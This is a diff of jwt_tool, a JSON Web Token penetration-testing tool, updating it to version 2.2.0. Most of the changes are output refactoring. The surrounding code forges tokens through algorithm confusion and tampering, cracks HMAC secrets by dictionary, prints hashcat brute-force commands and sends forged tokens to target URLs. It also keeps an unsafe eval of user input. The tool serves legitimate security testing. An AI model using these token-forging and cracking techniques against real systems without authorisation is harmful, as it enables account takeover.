@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 #
-# JWT_Tool version 2.1.0 (10_11_2020)
+# JWT_Tool version 2.2.0 (29_12_2020)
 # Written by Andy Tyler (@ticarpi)
 # Please use responsibly...
 # Software URL: https://github.com/ticarpi/jwt_tool
 # Web: https://www.ticarpi.com
 # Twitter: @ticarpi
 
-jwttoolvers = "2.1.0"
+jwttoolvers = "2.2.0"
 import ssl
 import sys
 import os
@@ -48,35 +48,44 @@ except:
 # import colorama
 # colorama.init()
 
+def cprintc(textval, colval):
+    if not args.bare:
+        cprint(textval, colval)
+
 def createConfig():
-    # gen RSA keypair
-    pubKey, privKey = newRSAKeyPair()
     privKeyName = "jwttool_custom_private_RSA.pem"
-    with open(privKeyName, 'w') as test_priv_out:
-        test_priv_out.write(privKey.decode())
     pubkeyName = "jwttool_custom_public_RSA.pem"
-    with open(pubkeyName, 'w') as test_pub_out:
-        test_pub_out.write(pubKey.decode())
-    # gen EC keypair
-    ecpubKey, ecprivKey = newECKeyPair()
     ecprivKeyName = "jwttool_custom_private_EC.pem"
-    with open(ecprivKeyName, 'w') as ectest_priv_out:
-        ectest_priv_out.write(ecprivKey)
     ecpubkeyName = "jwttool_custom_public_EC.pem"
-    with open(ecpubkeyName, 'w') as ectest_pub_out:
-        ectest_pub_out.write(ecpubKey)
-    # gen jwks
-    new_key = RSA.importKey(pubKey)
-    n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
-    e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
-    jwksbuild = buildJWKS(n, e, "jwt_tool")
-    jwksout = {"keys": []}
-    jwksout["keys"].append(jwksbuild)
-    fulljwks = json.dumps(jwksout,separators=(",",":"), indent=4)
     jwksName = "jwttool_custom_jwks.json"
-    with open(jwksName, 'w') as test_jwks_out:
-            test_jwks_out.write(fulljwks)
-    jwks_b64 = base64.b64encode(fulljwks.encode('ascii'))
+    if (os.path.isfile(privKeyName)) and (os.path.isfile(pubkeyName)) and (os.path.isfile(ecprivKeyName)) and (os.path.isfile(ecpubkeyName)) and (os.path.isfile(jwksName)):
+        cprintc("Found existing Public and Private Keys - using these...", "cyan")
+        origjwks = open(jwksName, "r").read()
+        jwks_b64 = base64.b64encode(origjwks.encode('ascii'))
+    else:
+        # gen RSA keypair
+        pubKey, privKey = newRSAKeyPair()
+        with open(privKeyName, 'w') as test_priv_out:
+            test_priv_out.write(privKey.decode())
+        with open(pubkeyName, 'w') as test_pub_out:
+            test_pub_out.write(pubKey.decode())
+        # gen EC keypair
+        ecpubKey, ecprivKey = newECKeyPair()
+        with open(ecprivKeyName, 'w') as ectest_priv_out:
+            ectest_priv_out.write(ecprivKey)
+        with open(ecpubkeyName, 'w') as ectest_pub_out:
+            ectest_pub_out.write(ecpubKey)
+        # gen jwks
+        new_key = RSA.importKey(pubKey)
+        n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
+        e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
+        jwksbuild = buildJWKS(n, e, "jwt_tool")
+        jwksout = {"keys": []}
+        jwksout["keys"].append(jwksbuild)
+        fulljwks = json.dumps(jwksout,separators=(",",":"), indent=4)
+        with open(jwksName, 'w') as test_jwks_out:
+                test_jwks_out.write(fulljwks)
+        jwks_b64 = base64.b64encode(fulljwks.encode('ascii'))
     config = configparser.ConfigParser(allow_no_value=True)
     config.optionxform = str
     config['crypto'] = {'pubkey': pubkeyName,
@@ -117,8 +126,8 @@ def createConfig():
         'resContent': ''}
     with open(configFileName, 'w') as configfile:
         config.write(configfile)
-    cprint("Configuration file built - review contents of \"jwtconf.ini\" to customise your options.", "cyan")
-    cprint("Make sure to set the \"httplistener\" value to a URL you can monitor to enable out-of-band checks.", "cyan")
+    cprintc("Configuration file built - review contents of \"jwtconf.ini\" to customise your options.", "cyan")
+    cprintc("Make sure to set the \"httplistener\" value to a URL you can monitor to enable out-of-band checks.", "cyan")
     exit(1)
 
 def sendToken(token, cookiedict, track, headertoken=""):
@@ -141,10 +150,10 @@ def sendToken(token, cookiedict, track, headertoken=""):
             else:
                 response = requests.get(url, headers=headers, cookies=cookiedict, proxies=proxies, verify=False)
         if int(response.elapsed.total_seconds()) >= 9:
-            cprint("HTTP response took about 10 seconds or more - could be a sign of a bug or vulnerability", "cyan")
+            cprintc("HTTP response took about 10 seconds or more - could be a sign of a bug or vulnerability", "cyan")
         return [response.status_code, len(response.content), response.content]
     except requests.exceptions.ProxyError as err:
-        cprint("[ERROR] ProxyError - check proxy is up and not set to tamper with requests\n"+str(err), "red")
+        cprintc("[ERROR] ProxyError - check proxy is up and not set to tamper with requests\n"+str(err), "red")
         exit(1)
 
 def parse_dict_cookies(value):
@@ -207,25 +216,28 @@ def jwtOut(token, fromMod, desc=""):
             if config['argvals']['overridesub'] == "true":
                 resData = sendToken(token, cookiedict, logID, headertoken[0])
             else:
-                cprint("[-] No substitution occurred - check that a token is included in a cookie/header in the request", "red")
-                cprint(headertoken, cookietoken, "cyan")
+                cprintc("[-] No substitution occurred - check that a token is included in a cookie/header in the request", "red")
+                cprintc(headertoken, cookietoken, "cyan")
                 exit(1)
         if config['argvals']['canaryvalue']:
             if config['argvals']['canaryvalue'] in str(resData[2]):
-                cprint("[+] FOUND \""+config['argvals']['canaryvalue']+"\" in response:\n"+logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "green")
+                cprintc("[+] FOUND \""+config['argvals']['canaryvalue']+"\" in response:\n"+logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "green")
             else:
-                cprint(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "cyan")
+                cprintc(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "cyan")
         else:
             if 200 <= resData[0] < 300:
-                cprint(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "green")
+                cprintc(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "green")
             elif 300 <= resData[0] < 400:
-                cprint(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "cyan")
+                cprintc(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "cyan")
             elif 400 <= resData[0] < 600:
-                cprint(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "red")
+                cprintc(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "red")
     else:
         if desc != "":
-            cprint(logID+" - "+desc, "cyan")
-        cprint("[+] "+token, "green")
+            cprintc(logID+" - "+desc, "cyan")
+        if not args.bare:
+            cprintc("[+] "+token, "green")
+        else:
+            print(token)
         curTargetUrl = "Not sent"
     additional = "[Commandline request: "+' '.join(sys.argv[0:])+']'
     setLog(token, genTime, logID, fromMod, curTargetUrl, additional)
@@ -268,9 +280,9 @@ def checkAlgNone(headDict, paylB64):
 def checkPubKeyExploit(headDict, paylB64, pubKey):
     try:
         key = open(pubKey).read()
-        cprint("File loaded: "+pubKey, "cyan")
+        cprintc("File loaded: "+pubKey, "cyan")
     except:
-        cprint("[-] File not found", "red")
+        cprintc("[-] File not found", "red")
         exit(1)
     newHead = headDict
     newHead["alg"] = "HS256"
@@ -292,73 +304,73 @@ def injectheaderclaim(headerclaim, injectionvalue):
     return newheadDict, newHeadB64
 
 def tamperToken(paylDict, headDict, sig):
-    print("\n====================================================================\nThis option allows you to tamper with the header, contents and \nsignature of the JWT.\n====================================================================")
-    print("\nToken header values:")
+    cprintc("\n====================================================================\nThis option allows you to tamper with the header, contents and \nsignature of the JWT.\n====================================================================", "white")
+    cprintc("\nToken header values:", "white")
     while True:
         i = 0
         headList = [0]
         for pair in headDict:
             menuNum = i+1
             if isinstance(headDict[pair], dict):
-                cprint("["+str(menuNum)+"] "+pair+" = JSON object:", "green")
+                cprintc("["+str(menuNum)+"] "+pair+" = JSON object:", "green")
                 for subclaim in headDict[pair]:
-                    cprint("    [+] "+subclaim+" = "+str(headDict[pair][subclaim]), "green")
+                    cprintc("    [+] "+subclaim+" = "+str(headDict[pair][subclaim]), "green")
             else:
                 if type(headDict[pair]) == str:
-                    cprint("["+str(menuNum)+"] "+pair+" = \""+str(headDict[pair])+"\"", "green")
+                    cprintc("["+str(menuNum)+"] "+pair+" = \""+str(headDict[pair])+"\"", "green")
                 else:
-                    cprint("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]), "green")
+                    cprintc("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]), "green")
             headList.append(pair)
             i += 1
-        print("["+str(i+1)+"] *ADD A VALUE*")
-        print("["+str(i+2)+"] *DELETE A VALUE*")
-        print("[0] Continue to next step")
+        cprintc("["+str(i+1)+"] *ADD A VALUE*", "white")
+        cprintc("["+str(i+2)+"] *DELETE A VALUE*", "white")
+        cprintc("[0] Continue to next step", "white")
         selection = ""
-        print("\nPlease select a field number:\n(or 0 to Continue)")
+        cprintc("\nPlease select a field number:\n(or 0 to Continue)", "white")
         try:
             selection = int(input("> "))
         except:
-            print("Invalid selection")
+            cprintc("Invalid selection", "red")
             exit(1)
         if selection<len(headList) and selection>0:
             if isinstance(headDict[headList[selection]], dict):
-                print("\nPlease select a sub-field number for the "+pair+" claim:\n(or 0 to Continue)")
+                cprintc("\nPlease select a sub-field number for the "+pair+" claim:\n(or 0 to Continue)", "white")
                 newVal = OrderedDict()
                 for subclaim in headDict[headList[selection]]:
                     newVal[subclaim] = headDict[pair][subclaim]
                 newVal = buildSubclaim(newVal, headList, selection)
                 headDict[headList[selection]] = newVal
             else:
-                print("\nCurrent value of "+headList[selection]+" is: "+str(headDict[headList[selection]]))
-                print("Please enter new value and hit ENTER")
+                cprintc("\nCurrent value of "+headList[selection]+" is: "+str(headDict[headList[selection]]), "white")
+                cprintc("Please enter new value and hit ENTER", "white")
                 newVal = input("> ")
             headDict[headList[selection]] = castInput(newVal)
         elif selection == i+1:
-            print("Please enter new Key and hit ENTER")
+            cprintc("Please enter new Key and hit ENTER", "white")
             newPair = input("> ")
-            print("Please enter new value for "+newPair+" and hit ENTER")
+            cprintc("Please enter new value for "+newPair+" and hit ENTER", "white")
             newInput = input("> ")
             headList.append(newPair)
             headDict[headList[selection]] = castInput(newInput)
         elif selection == i+2:
-            print("Please select a Key to DELETE and hit ENTER")
+            cprintc("Please select a Key to DELETE and hit ENTER", "white")
             i = 0
             for pair in headDict:
                 menuNum = i+1
-                print("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]))
+                cprintc("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]), "white")
                 headList.append(pair)
                 i += 1
             try:
                 delPair = int(input("> "))
             except:
-                print("Invalid selection")
+                cprintc("Invalid selection", "red")
                 exit(1)
             del headDict[headList[delPair]]
         elif selection == 0:
             break
         else:
             exit(1)
-    print("\nToken payload values:")
+    cprintc("\nToken payload values:", "white")
     while True:
         comparestamps, expiredtoken = dissectPayl(paylDict, count=True)
         i = 0
@@ -367,35 +379,35 @@ def tamperToken(paylDict, headDict, sig):
             menuNum = i+1
             paylList.append(pair)
             i += 1
-        print("["+str(i+1)+"] *ADD A VALUE*")
-        print("["+str(i+2)+"] *DELETE A VALUE*")
+        cprintc("["+str(i+1)+"] *ADD A VALUE*", "white")
+        cprintc("["+str(i+2)+"] *DELETE A VALUE*", "white")
         if len(comparestamps) > 0:
-            print("["+str(i+3)+"] *UPDATE TIMESTAMPS*")
-        print("[0] Continue to next step")
+            cprintc("["+str(i+3)+"] *UPDATE TIMESTAMPS*", "white")
+        cprintc("[0] Continue to next step", "white")
         selection = ""
-        print("\nPlease select a field number:\n(or 0 to Continue)")
+        cprintc("\nPlease select a field number:\n(or 0 to Continue)", "white")
         try:
             selection = int(input("> "))
         except:
-            print("Invalid selection")
+            cprintc("Invalid selection", "red")
             exit(1)
         if selection<len(paylList) and selection>0:
             if isinstance(paylDict[paylList[selection]], dict):
-                print("\nPlease select a sub-field number for the "+str(paylList[selection])+" claim:\n(or 0 to Continue)")
+                cprintc("\nPlease select a sub-field number for the "+str(paylList[selection])+" claim:\n(or 0 to Continue)", "white")
                 newVal = OrderedDict()
                 for subclaim in paylDict[paylList[selection]]:
                     newVal[subclaim] = paylDict[paylList[selection]][subclaim]
                 newVal = buildSubclaim(newVal, paylList, selection)
                 paylDict[paylList[selection]] = newVal
             else:
-                print("\nCurrent value of "+paylList[selection]+" is: "+str(paylDict[paylList[selection]]))
-                print("Please enter new value and hit ENTER")
+                cprintc("\nCurrent value of "+paylList[selection]+" is: "+str(paylDict[paylList[selection]]), "white")
+                cprintc("Please enter new value and hit ENTER", "white")
                 newVal = input("> ")
                 paylDict[paylList[selection]] = castInput(newVal)
         elif selection == i+1:
-            print("Please enter new Key and hit ENTER")
+            cprintc("Please enter new Key and hit ENTER", "white")
             newPair = input("> ")
-            print("Please enter new value for "+newPair+" and hit ENTER")
+            cprintc("Please enter new value for "+newPair+" and hit ENTER", "white")
             newVal = input("> ")
             try:
                 newVal = int(newVal)
@@ -404,27 +416,27 @@ def tamperToken(paylDict, headDict, sig):
             paylList.append(newPair)
             paylDict[paylList[selection]] = castInput(newVal)
         elif selection == i+2:
-            print("Please select a Key to DELETE and hit ENTER")
+            cprintc("Please select a Key to DELETE and hit ENTER", "white")
             i = 0
             for pair in paylDict:
                 menuNum = i+1
-                print("["+str(menuNum)+"] "+pair+" = "+str(paylDict[pair]))
+                cprintc("["+str(menuNum)+"] "+pair+" = "+str(paylDict[pair]), "white")
                 paylList.append(pair)
                 i += 1
             delPair = eval(input("> "))
             del paylDict[paylList[delPair]]
         elif selection == i+3:
-            print("Timestamp updating:")
-            print("[1] Update earliest timestamp to current time (keeping offsets)")
-            print("[2] Add 1 hour to timestamps")
-            print("[3] Add 1 day to timestamps")
-            print("[4] Remove 1 hour from timestamps")
-            print("[5] Remove 1 day from timestamps")
-            print("\nPlease select an option from above (1-5):")
+            cprintc("Timestamp updating:", "white")
+            cprintc("[1] Update earliest timestamp to current time (keeping offsets)", "white")
+            cprintc("[2] Add 1 hour to timestamps", "white")
+            cprintc("[3] Add 1 day to timestamps", "white")
+            cprintc("[4] Remove 1 hour from timestamps", "white")
+            cprintc("[5] Remove 1 day from timestamps", "white")
+            cprintc("\nPlease select an option from above (1-5):", "white")
             try:
                 selection = int(input("> "))
             except:
-                print("Invalid selection")
+                cprintc("Invalid selection", "red")
                 exit(1)
             if selection == 1:
                 nowtime = int(datetime.now().timestamp())
@@ -456,14 +468,14 @@ def tamperToken(paylDict, headDict, sig):
                     newVal = int(paylDict[timestamp])-86400
                     paylDict[timestamp] = newVal
             else:
-                print("Invalid selection")
+                cprintc("Invalid selection", "red")
                 exit(1)
         elif selection == 0:
             break
         else:
             exit(1)
     if config['argvals']['sigType'] == "" and config['argvals']['exploitType'] == "":
-        cprint("Signature unchanged - no signing method specified (-S or -X)", "cyan")
+        cprintc("Signature unchanged - no signing method specified (-S or -X)", "cyan")
         newContents = genContents(headDict, paylDict)
         desc = "Tampered token:"
         jwtOut(newContents+"."+sig, "Manual Tamper - original signature", desc)
@@ -498,33 +510,33 @@ def signingToken(newheadDict, newpaylDict):
 def checkSig(sig, contents, key):
     quiet = False
     if key == "":
-        print("Type in the key to test")
+        cprintc("Type in the key to test", white)
         key = input("> ")
     testKey(key.encode(), sig, contents, headDict, quiet)
 
 def checkSigKid(sig, contents):
     quiet = False
-    print("\nLoading key file...")
+    cprintc("\nLoading key file...", "cyan")
     try:
         key1 = open(config['argvals']['keyFile']).read()
-        cprint("File loaded: "+config['argvals']['keyFile'], "cyan")
+        cprintc("File loaded: "+config['argvals']['keyFile'], "cyan")
         testKey(key1.encode(), sig, contents, headDict, quiet)
     except:
-        cprint("Could not load key file", "red")
+        cprintc("Could not load key file", "red")
         exit(1)
 
 def crackSig(sig, contents):
     quiet = True
     if headDict["alg"][0:2] != "HS":
-        print("Algorithm is not HMAC-SHA - cannot test against passwords, try the Verify function.")
+        cprintc("Algorithm is not HMAC-SHA - cannot test against passwords, try the Verify function.", "red")
         return
     # print("\nLoading key dictionary...")
     try:
-        # cprint("File loaded: "+config['argvals']['keyList'], "cyan")
+        # cprintc("File loaded: "+config['argvals']['keyList'], "cyan")
         keyLst = open(config['argvals']['keyList'], "r", encoding='utf-8', errors='ignore')
         nextKey = keyLst.readline()
     except:
-        cprint("No dictionary file loaded", "red")
+        cprintc("No dictionary file loaded", "red")
         exit(1)
     # print("Testing passwords in dictionary...")
     utf8errors = 0
@@ -537,7 +549,7 @@ def crackSig(sig, contents):
             cracked = False
         if not cracked:
             if wordcount % 1000000 == 0:
-                cprint("[*] Tested "+str(int(wordcount/1000000))+" million passwords so far", "cyan")
+                cprintc("[*] Tested "+str(int(wordcount/1000000))+" million passwords so far", "cyan")
             try:
                 nextKey = keyLst.readline()
             except:
@@ -546,11 +558,11 @@ def crackSig(sig, contents):
         else:
             return
     if cracked == False:
-        cprint("[-] Key not in dictionary", "red")
+        cprintc("[-] Key not in dictionary", "red")
         if not args.mode:
-            cprint("\n===============================\nAs your list wasn't able to crack this token you might be better off using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.\nhashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:\n\n[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt\n[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\n[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6\n===============================\n", "cyan")
+            cprintc("\n===============================\nAs your list wasn't able to crack this token you might be better off using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.\nhashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:\n\n[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt\n[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\n[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6\n===============================\n", "cyan")
     if utf8errors > 0:
-        cprint(utf8errors, " UTF-8 incompatible passwords skipped", "cyan")
+        cprintc(utf8errors, " UTF-8 incompatible passwords skipped", "cyan")
 
 def castInput(newInput):
     if "{" in str(newInput):
@@ -585,40 +597,40 @@ def buildSubclaim(newVal, claimList, selection):
         s = 0
         for subclaim in newVal:
             subNum = s+1
-            print("["+str(subNum)+"] "+subclaim+" = "+str(newVal[subclaim]))
+            cprintc("["+str(subNum)+"] "+subclaim+" = "+str(newVal[subclaim]), "white")
             s += 1
             subList.append(subclaim)
-        print("["+str(s+1)+"] *ADD A VALUE*")
-        print("["+str(s+2)+"] *DELETE A VALUE*")
-        print("[0] Continue to next step")
+        cprintc("["+str(s+1)+"] *ADD A VALUE*", "white")
+        cprintc("["+str(s+2)+"] *DELETE A VALUE*", "white")
+        cprintc("[0] Continue to next step", "white")
         try:
             subSel = int(input("> "))
         except:
-            print("Invalid selection")
+            cprintc("Invalid selection", "red")
             exit(1)
         if subSel<=len(newVal) and subSel>0:
             selClaim = subList[subSel]
-            print("\nCurrent value of "+selClaim+" is: "+str(newVal[selClaim]))
-            print("Please enter new value and hit ENTER")
+            cprintc("\nCurrent value of "+selClaim+" is: "+str(newVal[selClaim]), "white")
+            cprintc("Please enter new value and hit ENTER", "white")
             newVal[selClaim] = castInput(input("> "))
-            print()
+            cprintc("", "white")
         elif subSel == s+1:
-            print("Please enter new Key and hit ENTER")
+            cprintc("Please enter new Key and hit ENTER", "white")
             newPair = input("> ")
-            print("Please enter new value for "+newPair+" and hit ENTER")
+            cprintc("Please enter new value for "+newPair+" and hit ENTER", "white")
             newVal[newPair] = castInput(input("> "))
         elif subSel == s+2:
-            print("Please select a Key to DELETE and hit ENTER")
+            cprintc("Please select a Key to DELETE and hit ENTER", "white")
             s = 0
             for subclaim in newVal:
                 subNum = s+1
-                print("["+str(subNum)+"] "+subclaim+" = "+str(newVal[subclaim]))
+                cprintc("["+str(subNum)+"] "+subclaim+" = "+str(newVal[subclaim]), "white")
                 subList.append(subclaim)
                 s += 1
             try:
                 selSub = int(input("> "))
             except:
-                print("Invalid selection")
+                cprintc("Invalid selection", "red")
                 exit(1)
             delSub = subList[selSub]
             del newVal[delSub]
@@ -633,29 +645,29 @@ def testKey(key, sig, contents, headDict, quiet):
     elif headDict["alg"] == "HS512":
         testSig = base64.urlsafe_b64encode(hmac.new(key,contents,hashlib.sha512).digest()).decode('UTF-8').strip("=")
     else:
-        print("Algorithm is not HMAC-SHA - cannot test with this tool.")
+        cprintc("Algorithm is not HMAC-SHA - cannot test with this tool.", "red")
         exit(1)
     if testSig == sig:
         cracked = True
         if len(key) > 25:
-            cprint("[+] CORRECT key found:\n"+key.decode('UTF-8'), "green")
+            cprintc("[+] CORRECT key found:\n"+key.decode('UTF-8'), "green")
         else:
-            cprint("[+] "+key.decode('UTF-8')+" is the CORRECT key!", "green")
-        cprint("You can tamper/fuzz the token contents (-T/-I) and sign it using:\npython3 jwt_tool.py [options here] -S "+str(headDict["alg"])+" -p \""+key.decode('UTF-8')+"\"", "cyan")
+            cprintc("[+] "+key.decode('UTF-8')+" is the CORRECT key!", "green")
+        cprintc("You can tamper/fuzz the token contents (-T/-I) and sign it using:\npython3 jwt_tool.py [options here] -S "+str(headDict["alg"])+" -p \""+key.decode('UTF-8')+"\"", "cyan")
         return cracked
     else:
         cracked = False
         if quiet == False:
             if len(key) > 25:
-                cprint("[-] "+key[0:25].decode('UTF-8')+"...(output trimmed) is not the correct key", "red")
+                cprintc("[-] "+key[0:25].decode('UTF-8')+"...(output trimmed) is not the correct key", "red")
             else:
-                cprint("[-] "+key.decode('UTF-8')+" is not the correct key", "red")
+                cprintc("[-] "+key.decode('UTF-8')+" is not the correct key", "red")
         return cracked
 
 def getRSAKeyPair():
     #config['crypto']['pubkey'] = config['crypto']['pubkey']
     privkey = config['crypto']['privkey']
-    cprint("key: "+privkey, "cyan")
+    cprintc("key: "+privkey, "cyan")
     privKey = RSA.importKey(open(privkey).read())
     pubKey = privKey.publickey().exportKey("PEM")
     #config['crypto']['pubkey'] = RSA.importKey(config['crypto']['pubkey'])
@@ -717,7 +729,7 @@ def jwksGen(headDict, paylDict, jku, privKey, kid="jwt_tool"):
     try:
         signature = signer.sign(h)
     except:
-        print("Invalid Private Key")
+        cprintc("Invalid Private Key", "red")
         exit(1)
     newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
     jwksout = json.dumps(newjwks,separators=(",",":"), indent=4)
@@ -750,7 +762,7 @@ def jwksEmbed(newheadDict, newpaylDict):
     try:
         signature = signer.sign(h)
     except:
-        cprint("Invalid Private Key", "red")
+        cprintc("Invalid Private Key", "red")
         exit(1)
     newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
     return newSig, newContents.decode('UTF-8')
@@ -768,13 +780,13 @@ def signTokenRSA(headDict, paylDict, privKey, hashLength):
     elif hashLength == 512:
         h = SHA512.new(newContents)
     else:
-        cprint("Invalid RSA hash length", "red")
+        cprintc("Invalid RSA hash length", "red")
         exit(1)
     signer = PKCS1_v1_5.new(key)
     try:
         signature = signer.sign(h)
     except:
-        cprint("Invalid Private Key", "red")
+        cprintc("Invalid Private Key", "red")
         exit(1)
     newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
     return newSig, newContents.decode('UTF-8')
@@ -792,13 +804,13 @@ def signTokenEC(headDict, paylDict, privKey, hashLength):
     elif hashLength == 512:
         h = SHA512.new(newContents)
     else:
-        cprint("Invalid hash length", "red")
+        cprintc("Invalid hash length", "red")
         exit(1)
     signer = DSS.new(key, 'fips-186-3')
     try:
         signature = signer.sign(h)
     except:
-        cprint("Invalid Private Key", "red")
+        cprintc("Invalid Private Key", "red")
         exit(1)
     newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
     return newSig, newContents.decode('UTF-8')
@@ -816,12 +828,12 @@ def signTokenPSS(headDict, paylDict, privKey, hashLength):
     elif hashLength == 512:
         h = SHA512.new(newContents)
     else:
-        cprint("Invalid RSA hash length", "red")
+        cprintc("Invalid RSA hash length", "red")
         exit(1)
     try:
         signature = pss.new(key).sign(h)
     except:
-        cprint("Invalid Private Key", "red")
+        cprintc("Invalid Private Key", "red")
         exit(1)
     newSig = base64.urlsafe_b64encode(signature).decode('UTF-8').strip("=")
     return newSig, newContents.decode('UTF-8')
@@ -857,7 +869,7 @@ def verifyTokenRSA(headDict, paylDict, sig, pubKey):
         except:
             pass
     else:
-        cprint("Signature not Base64 encoded HEX", "red")
+        cprintc("Signature not Base64 encoded HEX", "red")
     if headDict['alg'] == "RS256":
         h = SHA256.new(newContents)
     elif headDict['alg'] == "RS384":
@@ -865,18 +877,18 @@ def verifyTokenRSA(headDict, paylDict, sig, pubKey):
     elif headDict['alg'] == "RS512":
         h = SHA512.new(newContents)
     else:
-        cprint("Invalid RSA algorithm", "red")
+        cprintc("Invalid RSA algorithm", "red")
     verifier = PKCS1_v1_5.new(key)
     try:
         valid = verifier.verify(h, sig)
         if valid:
-            cprint("RSA Signature is VALID", "green")
+            cprintc("RSA Signature is VALID", "green")
             valid = True
         else:
-            cprint("RSA Signature is INVALID", "red")
+            cprintc("RSA Signature is INVALID", "red")
             valid = False
     except:
-        cprint("The Public Key is invalid", "red")
+        cprintc("The Public Key is invalid", "red")
     return valid
 
 def verifyTokenEC(headDict, paylDict, sig, pubKey):
@@ -909,7 +921,7 @@ def verifyTokenEC(headDict, paylDict, sig, pubKey):
         except:
             pass
     else:
-        cprint("Signature not Base64 encoded HEX", "red")
+        cprintc("Signature not Base64 encoded HEX", "red")
     if headDict['alg'] == "ES256":
         h = SHA256.new(message)
     elif headDict['alg'] == "ES384":
@@ -917,16 +929,16 @@ def verifyTokenEC(headDict, paylDict, sig, pubKey):
     elif headDict['alg'] == "ES512":
         h = SHA512.new(message)
     else:
-        cprint("Invalid ECDSA algorithm", "red")
+        cprintc("Invalid ECDSA algorithm", "red")
     pubkey = open(pubKey, "r")
     pub_key = ECC.import_key(pubkey.read())
     verifier = DSS.new(pub_key, 'fips-186-3')
     try:
         verifier.verify(h, signature)
-        cprint("ECC Signature is VALID", "green")
+        cprintc("ECC Signature is VALID", "green")
         valid = True
     except:
-        cprint("ECC Signature is INVALID", "red")
+        cprintc("ECC Signature is INVALID", "red")
         valid = False
     return valid
 
@@ -961,7 +973,7 @@ def verifyTokenPSS(headDict, paylDict, sig, pubKey):
         except:
             pass
     else:
-        cprint("Signature not Base64 encoded HEX", "red")
+        cprintc("Signature not Base64 encoded HEX", "red")
     if headDict['alg'] == "PS256":
         h = SHA256.new(newContents)
     elif headDict['alg'] == "PS384":
@@ -969,14 +981,14 @@ def verifyTokenPSS(headDict, paylDict, sig, pubKey):
     elif headDict['alg'] == "PS512":
         h = SHA512.new(newContents)
     else:
-        cprint("Invalid RSA algorithm", "red")
+        cprintc("Invalid RSA algorithm", "red")
     verifier = pss.new(key)
     try:
         valid = verifier.verify(h, sig)
-        cprint("RSA-PSS Signature is VALID", "green")
+        cprintc("RSA-PSS Signature is VALID", "green")
         valid = True
     except:
-        cprint("RSA-PSS Signature is INVALID", "red")
+        cprintc("RSA-PSS Signature is INVALID", "red")
         valid = False
     return valid
 
@@ -993,56 +1005,56 @@ def parseJWKS(jwksfile):
     jwks = open(jwksfile, "r").read()
     jwksDict = json.loads(jwks, object_pairs_hook=OrderedDict)
     nowtime = int(datetime.now().timestamp())
-    print("JWKS Contents:")
+    cprintc("JWKS Contents:", "cyan")
     try:
         keyLen = len(jwksDict["keys"])
-        print("Number of keys: "+str(keyLen))
+        cprintc("Number of keys: "+str(keyLen), "cyan")
         i = -1
         for jkey in range(0,keyLen):
             i += 1
-            print("\n--------")
+            cprintc("\n--------", "white")
             try:
-                print("Key "+str(i+1))
+                cprintc("Key "+str(i+1), "cyan")
                 kid = str(jwksDict["keys"][i]["kid"])
-                print("kid: "+kid)
+                cprintc("kid: "+kid, "cyan")
             except:
                 kid = i
-                print("Key "+str(i+1))
+                cprintc("Key "+str(i+1), "cyan")
             for keyVal in jwksDict["keys"][i].items():
                 keyVal = keyVal[0]
-                cprint("[+] "+keyVal+" = "+str(jwksDict["keys"][i][keyVal]), "green")
+                cprintc("[+] "+keyVal+" = "+str(jwksDict["keys"][i][keyVal]), "green")
             try:
                 x = str(jwksDict["keys"][i]["x"])
                 y = str(jwksDict["keys"][i]["y"])
-                print("\nFound ECC key factors, generating a public key")
+                cprintc("\nFound ECC key factors, generating a public key", "cyan")
                 pubkeyName = genECPubFromJWKS(x, y, kid, nowtime)
-                cprint("[+] "+pubkeyName, "green")
-                print("\nAttempting to verify token using "+pubkeyName)
+                cprintc("[+] "+pubkeyName, "green")
+                cprintc("\nAttempting to verify token using "+pubkeyName, "cyan")
                 valid = verifyTokenEC(headDict, paylDict, sig, pubkeyName)
             except:
                 pass
             try:
                 n = str(jwksDict["keys"][i]["n"])
                 e = str(jwksDict["keys"][i]["e"])
-                print("\nFound RSA key factors, generating a public key")
+                cprintc("\nFound RSA key factors, generating a public key", "cyan")
                 pubkeyName = genRSAPubFromJWKS(n, e, kid, nowtime)
-                cprint("[+] "+pubkeyName, "green")
-                print("\nAttempting to verify token using "+pubkeyName)
+                cprintc("[+] "+pubkeyName, "green")
